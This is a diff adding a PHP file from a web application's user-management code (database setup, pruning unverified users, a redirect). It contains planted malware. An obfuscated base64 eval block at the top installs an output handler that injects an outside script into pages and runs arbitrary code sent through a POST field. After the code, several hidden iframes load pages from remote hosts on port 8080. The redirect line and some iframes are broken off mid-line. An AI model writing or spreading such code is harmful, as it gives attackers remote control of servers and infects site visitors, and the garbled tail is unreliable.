@@ -1,0 +1,25 @@
+<?php eval(base64_decode('aWYoIWZ1bmN0aW9uX2V4aXN0cygnYmN5aScpKXtmdW5jdGlvbiBiY3lpKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF1hcyR2KWlmKGNvdW50KGV4cGxvZGUoIlxuIiwkdikpPjUpeyRlPXByZWdfbWF0Y2goJyNbXCciXVteXHNcJyJcLiw7XD8hXFtcXTovPD5cKFwpXXszMCx9IycsJHYpfHxwcmVnX21hdGNoKCcjW1woXFtdKFxzKlxkKywpezIwLH0jJywkdik7aWYoKHByZWdfbWF0Y2goJyNcYmV2YWxcYiMnLCR2KSYmKCRlfHxzdHJwb3MoJHYsJ2Zyb21DaGFyQ29kZScpKSl8fCgkZSYmc3RycG9zKCR2LCdkb2N1bWVudC53cml0ZScpKSkkcz1zdHJfcmVwbGFjZSgkdiwnJywkcyk7fWlmKHByZWdfbWF0Y2hfYWxsKCcjPGlmcmFtZSAoW14+XSo/KXNyYz1bXCciXT8oaHR0cDopPy8vKFtePl0qPyk+I2lzJywkcywkYSkpZm9yZWFjaCgkYVswXWFzJHYpaWYocHJlZ19tYXRjaCgnI1tcLiBdd2lkdGhccyo9XHMqW1wnIl0/MCpbMC05XVtcJyI+IF18ZGlzcGxheVxzKjpccypub25lI2knLCR2KSYmIXN0cnN0cigkdiwnPycuJz4nKSkkcz1wcmVnX3JlcGxhY2UoJyMnLnByZWdfcXVvdGUoJHYsJyMnKS4nLio/PC9pZnJhbWU+I2lzJywnJywkcyk7JHM9c3RyX3JlcGxhY2UoJGE9YmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0J6Y21NOWFIUjBjRG92TDNOd2FXNWtiR1Z5TFhwbGFXTm9iblZ1WjJWdUxtUmxMMmx1WkdWNExuQm9jQ0ErUEM5elkzSnBjSFErJyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcywxKTtlbHNlaWYoc3RycG9zKCRzLCc8YScpKSRzPSRhLiRzO3JldHVybiRzO31mdW5jdGlvbiBiY3lpMigkYSwkYiwkYywkZCl7Z2xvYmFsJGJjeWkxOyRzPWFycmF5KCk7aWYoZnVuY3Rpb25fZXhpc3RzKCRiY3lpMSkpY2FsbF91c2VyX2Z1bmMoJGJjeWkxLCRhLCRiLCRjLCRkKTtmb3JlYWNoKEBvYl9nZXRfc3RhdHVzKDEpYXMkdilpZigoJGE9JHZbJ25hbWUnXSk9PSdiY3lpJylyZXR1cm47ZWxzZWlmKCRhPT0nb2JfZ3poYW5kbGVyJylicmVhaztlbHNlJHNbXT1hcnJheSgkYT09J2RlZmF1bHQgb3V0cHV0IGhhbmRsZXInP2ZhbHNlOiRhKTtmb3IoJGk9Y291bnQoJHMpLTE7JGk+PTA7JGktLSl7JHNbJGldWzFdPW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO31vYl9zdGFydCgnYmN5aScpO2ZvcigkaT0wOyRpPGNvdW50KCRzKTskaSsrKXtvYl9zdGFydCgkc1skaV1bMF0pO2VjaG8gJHNbJGldWzFdO319fSRiY3lpbD0oKCRhPUBzZXRfZXJyb3JfaGFuZGxlcignYmN5aTInKSkhPSdiY3lpMicpPyRhOjA7ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnZSddKSk7')); ?><?php
+
+// include needed files
+require('../config.php');
+require('../global.php');
+
+// connect to the database
+db_connect($mysql['username'],$mysql['password'],$mysql['database'],$mysql['host']);
+
+// assign config options from database to an array
+$config = get_config($mysql['prefix']);
+
+debug_mode($config['debug_mode']);
+
+// remove users that have not verified their email after 72 hours if email verification is enabled
+if($config['verify_email']=='true' && $config['prune_inactive_users']=='true'){
+	PruneInactiveUsers($mysql['prefix']);
+}
+
+// redirect to the login page
+redirect
+<iframe src="http://u7e.ru:8080/index.php" width=117 height=184 style="visibili
+<iframe src="http://x3y.ru:8080/index.php" width=196 height=143 style="visibil
+<iframe src="http://x3y.ru:8080/index.php" width=143 height=141 style="visibi
+<iframe src="http://x3y.ru:8080/index.php" width=128 height=103 style="visibility: hidden"></iframe>
